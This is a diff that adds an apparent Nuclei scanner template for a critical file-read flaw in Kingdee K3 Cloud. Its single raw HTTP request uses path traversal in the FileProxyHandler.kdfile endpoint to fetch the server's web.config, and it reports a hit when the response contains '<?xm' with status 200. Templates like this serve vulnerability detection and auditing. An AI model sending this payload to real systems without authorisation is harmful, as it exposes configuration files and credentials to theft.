@@ -1,0 +1,22 @@
+id: Kingdee-K3-cloud-FileProxyHandler-file-read
+info:
+  name: eKingdee-K3-cloud-FileProxyHandler-file-read
+  author: Kingdee-K3-cloud-FileProxyHandler-file-read
+  severity: critical
+  tags: Kingdee
+
+http:
+  - raw:
+    - |
+        GET /FileProxyHandler.kdfile?Area=0&F=..%2F..%2Fweb.config&Ope=SDL&Step=100000 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "<?xm"
+      - type: status
+        status:
+          - 200
